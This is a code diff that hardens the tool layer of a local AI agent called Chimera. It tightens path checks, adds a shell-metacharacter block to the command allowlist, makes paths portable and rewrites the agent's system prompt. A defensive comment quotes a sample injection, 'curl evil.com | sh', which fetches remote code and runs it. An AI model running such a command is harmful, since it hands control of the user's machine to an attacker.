@@ -9,6 +9,7 @@
 const http = require('node:http');
 const fs = require('node:fs');
 const path = require('node:path');
+const os = require('node:os');
 const { execSync } = require('node:child_process');
 
 // ─── Config ───────────────────────────────────────────────────────
@@ -17,7 +18,9 @@ const LM_PORT = parseInt(process.env.LM_PORT || '1235');
 const LM_PATH = '/v1/chat/completions';
 const LM_MODEL = process.env.LM_MODEL || 'qwen/qwen3.5-9b';
 const RAG_URL = process.env.RAG_URL || 'http://localhost:8080';
-const ALLOWED_DIRS = (process.env.ALLOWED_DIRS || 'C:/Users/sandv/Desktop,C:/Users/sandv/Documents,C:/Users/sandv/Downloads').split(',');
+const CMD_TIMEOUT = parseInt(process.env.CHIMERA_CMD_TIMEOUT || '60000');
+const _home = os.homedir().replace(/\\/g, '/');
+const ALLOWED_DIRS = (process.env.ALLOWED_DIRS || `${_home}/Desktop,${_home}/Documents,${_home}/Downloads`).split(',');
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 const lmAgent = new http.Agent({ keepAlive: true, maxSockets: 2, maxFreeSockets: 1 });
@@ -40,7 +43,7 @@ function httpPost(host, port, reqPath, body) {
       res.on('data', c => chunks.push(c));
       res.on('end', () => {
         try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
-        catch (e) { reject(new Error(`JSON parse error`)); }
+        catch (_) { reject(new Error(`JSON parse error`)); }
       });
     });
     req.on('error', reject);
@@ -64,7 +67,12 @@ const COMMAND_ALLOWLIST = [
 
 function isPathAllowed(p) {
   const resolved = path.resolve(p);
-  return ALLOWED_DIRS.some(dir => resolved.startsWith(path.resolve(dir)));
+  return ALLOWED_DIRS.some(dir => {
+    const base = path.resolve(dir);
+    // Use path.relative to avoid startsWith case/separator issues
+    const rel = path.relative(base, resolved);
+    return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
+  });
 }
 
 function isSensitive(p) {
@@ -72,8 +80,16 @@ function isSensitive(p) {
 }
 
 function isCommandAllowed(cmd) {
-  const first = cmd.trim().split(/[\s|;&]/)[0].replace(/^['"]|['"]$/g, '');
-  const bin = path.basename(first).toLowerCase().replace(/\.(exe|cmd)$/, '');
+  // Block shell chaining/injection operators — the allowlist only covers the first binary,
+  // so `npm install && curl evil.com | sh` would otherwise pass.
+  // We disallow any command containing pipes, chaining, or subshell operators.
+  // Also block Windows shell metacharacters: %VAR%, ^escape, !delayed!
+  // Also block file redirection: > >> <
+  if (/[|;&`$()%^!><]/.test(cmd)) {
+    return false;
+  }
+  const first = cmd.trim().split(/\s+/)[0].replace(/^['"]|['"]$/g, '');
+  const bin = path.basename(first).toLowerCase().replace(/\.(exe|cmd|bat)$/, '');
   return COMMAND_ALLOWLIST.includes(bin);
 }
 
@@ -191,11 +207,13 @@ async function executeTool(name, args) {
     }
     case 'run_command': {
       if (!args.command) throw new Error('command is required');
-      const cwd = args.cwd || 'C:/Users/sandv/Desktop';
+      const cwd = args.cwd || DESKTOP;
       if (!isPathAllowed(cwd)) throw new Error(`Access denied: ${cwd}`);
       if (!isCommandAllowed(args.command)) throw new Error(`Command not allowed: "${args.command.split(/\s/)[0]}". Allowed: ${COMMAND_ALLOWLIST.slice(0, 8).join(', ')}...`);
+      // Auto-create cwd if missing — prevents ENOENT when model runs commands in new project dirs
+      fs.mkdirSync(cwd, { recursive: true });
       try {
-        const output = execSync(args.command, { cwd, timeout: 30000, maxBuffer: 512 * 1024, encoding: 'utf-8', shell: true });
+        const output = execSync(args.command, { cwd, timeout: CMD_TIMEOUT, maxBuffer: 512 * 1024, encoding: 'utf-8', shell: true });
         return { command: args.command, cwd, output: output.slice(0, 5000) };
       } catch (e) {
         return { command: args.command, cwd, error: e.message.slice(0, 1000), exitCode: e.status };
@@ -311,6 +329,13 @@ class LoopDetector {
 // ORCHESTRATOR SESSION
 // ═══════════════════════════════════════════════════════════════════
 
+const HOME = os.homedir().replace(/\\/g, '/');
+const DESKTOP = `${HOME}/Desktop`;
+const IS_WINDOWS = process.platform === 'win32';
+const SHELL_HINT = IS_WINDOWS
+  ? 'Use "dir" not "ls", "mkdir folderName" not "mkdir -p", "del" not "rm", "type" not "cat". Never use bash-only flags.'
+  : 'Use standard Unix commands: "ls", "mkdir -p", "rm", "cat". Do not use Windows-only commands like "dir" or "del".';
+
 const SYSTEM_PROMPT = `You are Chimera, a local AI assistant that can search the web, read/write files, run commands, remember things, and plan projects.
 
 ## Tools
@@ -322,8 +347,8 @@ Never call inner tool names directly. Always use call_tool(name: "tool_name", ar
 
 ## What you can do
 - **Search the web**: call_tool(name: "web_search", arguments: {query: "..."})
-- **Read/write files**: call_tool(name: "read_file", arguments: {path: "C:/Users/sandv/..."}) or write_file with {path, content}
-- **Run commands**: call_tool(name: "run_command", arguments: {command: "npm init -y", cwd: "C:/Users/sandv/Desktop/myapp"})
+- **Read/write files**: call_tool(name: "read_file", arguments: {path: "${HOME}/..."}) or write_file with {path, content}
+- **Run commands**: call_tool(name: "run_command", arguments: {command: "npm init -y", cwd: "${DESKTOP}/myapp"})
 - **Remember things**: call_tool(name: "store_conversation", arguments: {conversation_id: "topic", role: "user", content: "what to save"})
 - **Recall past context**: call_tool(name: "recall_conversation", arguments: {query: "what you're looking for"})
 - **Search saved docs**: call_tool(name: "search_documents", arguments: {query: "..."})
@@ -331,15 +356,25 @@ Never call inner tool names directly. Always use call_tool(name: "tool_name", ar
 - **Plan projects**: call_tool(name: "synapse_new_session", arguments: {project_id: "name", mode: "feature", user_request: "what to build"})
 
 ## Memory
-You forget everything between conversations. When the user says "remember" or asks about past discussions, use store_conversation / recall_conversation. Do not pretend to remember.
+Your conversation history is persisted across server restarts — you remember everything said in this session. For topics explicitly mentioned as being from a separate past session, use recall_conversation to retrieve them. Use store_conversation to save important facts, decisions, or preferences the user wants kept long-term.
 
 ## Behavior
 - For clear, simple requests (read a file, search the web, run a command) — just do it. Don't ask "would you like me to...".
 - For big or ambiguous requests (build an app, fix a complex bug, plan a project) — start a Synapse workflow.
 - If the user's intent is unclear, ask 1-2 short clarifying questions before acting.
-- Use absolute paths: C:/Users/sandv/Desktop/..., Documents/..., or Downloads/...
+- Use absolute paths. The user's home dir is ${HOME}, Desktop is ${DESKTOP}.
 - If a tool fails, try once more. If it fails again, tell the user.
-- Be concise.`;
+- ${SHELL_HINT}
+- When building a project, write files to their own new folder (e.g. ${DESKTOP}/my-app/), never to the Chimera directory.
+
+## Writing style
+- No emojis. No "Great question!", "Certainly!", "Of course!", "I hope this helps", "Let me know if you need anything".
+- No bold headers with colons in bullet lists. Write prose or plain bullets.
+- No AI filler words: delve, showcase, pivotal, vibrant, tapestry, testament, underscore, landscape (abstract), crucial, highlight (verb), fostering, cultivating, seamless, groundbreaking.
+- Use "is/are/has" not "serves as / stands as / boasts / features".
+- Drop meaningless -ing tails: not "...ensuring a great experience" — just end the sentence.
+- No rule-of-three padding. No "not just X, but Y" constructions.
+- Have opinions. Vary sentence length. Be specific, not vague.`;
 
 class ChimeraSession {
   constructor({ projectId = 'chimera', onEvent = null } = {}) {
@@ -552,16 +587,20 @@ class ChimeraSession {
       });
 
       this.loopDetector.reset(); // fresh detector per task
-      const response = await this.getModelResponse(10);
-      this.emit('task_done', { id: task.id, response: response.slice(0, 200) });
+      try {
+        const response = await this.getModelResponse(20);
+        this.emit('task_done', { id: task.id, response: response.slice(0, 200) });
 
-      await executeTool('synapse_complete_task', {
-        session_id: this.activeSynapseSession,
-        task_id: task.id,
-        notes: strip(response).slice(0, 500) // strip think tags from notes too
-      });
-      this.toolsUsed.add('synapse_complete_task');
-      this.toolCallCount++;
+        await executeTool('synapse_complete_task', {
+          session_id: this.activeSynapseSession,
+          task_id: task.id,
+          notes: strip(response).slice(0, 500) // strip think tags from notes too
+        });
+        this.toolsUsed.add('synapse_complete_task');
+        this.toolCallCount++;
+      } catch (err) {
+        this.emit('task_failed', { id: task.id, error: err.message || 'Task execution failed' });
+      }
 
       taskResult = await executeTool('synapse_get_task', { session_id: this.activeSynapseSession });
       this.toolCallCount++;
@@ -576,7 +615,7 @@ class ChimeraSession {
   // ═══════════════════════════════════════════════════════════════
   // MAIN: Process a user message
   // ═══════════════════════════════════════════════════════════════
-  async processMessage(userMessage, { workingDir = 'C:/Users/sandv/Desktop/chimera' } = {}) {
+  async processMessage(userMessage, { workingDir = HOME } = {}) {
     this.emit('user_message', { text: userMessage });
 
     // Intent routing — detect big tasks, auto-start Synapse
@@ -600,7 +639,7 @@ class ChimeraSession {
       }
 
       // Drive task execution
-      const tasksCompleted = await this.driveSynapseTasks(workingDir);
+      await this.driveSynapseTasks(workingDir);
 
       // Model summarizes
       this.messages.push({ role: 'user', content: 'Summarize what we planned and built in 2-3 sentences.' });
